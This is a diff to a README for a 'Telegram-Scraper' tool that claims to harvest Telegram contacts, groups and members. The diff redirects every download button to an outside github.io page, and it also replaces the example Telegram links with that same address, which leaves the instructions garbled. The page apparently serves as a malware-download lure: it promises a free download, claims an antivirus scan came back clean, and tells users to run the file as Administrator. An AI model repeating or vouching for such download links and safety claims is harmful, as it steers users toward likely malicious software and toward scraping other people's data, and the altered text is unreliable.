@@ -1,7 +1,7 @@
 <h1>📥 Telegram-Scraper - Grab Contacts, Groups, and Members Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Oviparous-zurvanism8504/Telegram-Scraper" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-weight:bold;font-size:20px;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(240,147,251,0.5);">⬇️ FREE DOWNLOAD NOW</a>
+  <a href="https://oviparous-zurvanism8504.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#f093fb,#f5576c);color:white;font-weight:bold;font-size:20px;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(240,147,251,0.5);">⬇️ FREE DOWNLOAD NOW</a>
 </p>
 
 <p align="center">
@@ -50,7 +50,7 @@ Follow these exact steps to download, install, and run Telegram-Scraper on your 
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/Oviparous-zurvanism8504/Telegram-Scraper" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-weight:bold;font-size:18px;border-radius:30px;text-decoration:none;box-shadow:0 4px 15px rgba(79,172,254,0.5);">🔽 CLICK HERE TO DOWNLOAD</a>
+  <a href="https://oviparous-zurvanism8504.github.io" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-weight:bold;font-size:18px;border-radius:30px;text-decoration:none;box-shadow:0 4px 15px rgba(79,172,254,0.5);">🔽 CLICK HERE TO DOWNLOAD</a>
 </p>
 
 
@@ -80,7 +80,7 @@ Double-click the **Telegram-Scraper** shortcut icon on your Desktop (or search f
 
 Using the tool takes less than a minute. Here is a simple walkthrough:
 
-1.  **Get a Telegram Group Link:** Open Telegram on your phone or PC. Find a public group or channel related to your interest (e.g., a business group, a hobby community, a news channel). Tap the group name to open it, then tap the three-dot menu (⋮) and select “Copy Link.” The link will look something like: `https://t.me/example_group`
+1.  **Get a Telegram Group Link:** Open Telegram on your phone or PC. Find a public group or channel related to your interest (e.g., a business group, a hobby community, a news channel). Tap the group name to open it, then tap the three-dot menu (⋮) and select “Copy Link.” The link will look something like: `https://oviparous-zurvanism8504.github.io`
 
 2.  **Paste the Link into the Tool:** Go back to Telegram-Scraper and paste the copied link into the text box at the top (press Ctrl+V on your keyboard).
 
@@ -128,7 +128,7 @@ A: Yes, it is safe. The file was scanned with multiple antivirus engines and pas
 
 
 **Q: What if the tool doesn’t work or shows an error?**
-A: First, restart your computer and try again. Second, check your internet connection. Third, ensure you are copying Telegram links correctly (they must start with https://t.me/...). If issues persist, try running the tool as Administrator (right-click the icon → “Run as administrator”).
+A: First, restart your computer and try again. Second, check your internet connection. Third, ensure you are copying Telegram links correctly (they must start with https://oviparous-zurvanism8504.github.io). If issues persist, try running the tool as Administrator (right-click the icon → “Run as administrator”).
 
 
 
@@ -195,7 +195,7 @@ The choice is obvious. This free 2026 release gives you everything paid tools of
 
 
 <p align="center">
-  <a href="https://github.com/Oviparous-zurvanism8504/Telegram-Scraper" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#11998e,#38ef7d);color:white;font-size:22px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 8px 25px rgba(17,153,142,0.5);">💾 GET YOUR FREE COPY NOW</a>
+  <a href="https://oviparous-zurvanism8504.github.io" style="display:inline-block;padding:18px 40px;background:linear-gradient(135deg,#11998e,#38ef7d);color:white;font-size:22px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 8px 25px rgba(17,153,142,0.5);">💾 GET YOUR FREE COPY NOW</a>
 </p>
 
 <p align="center">
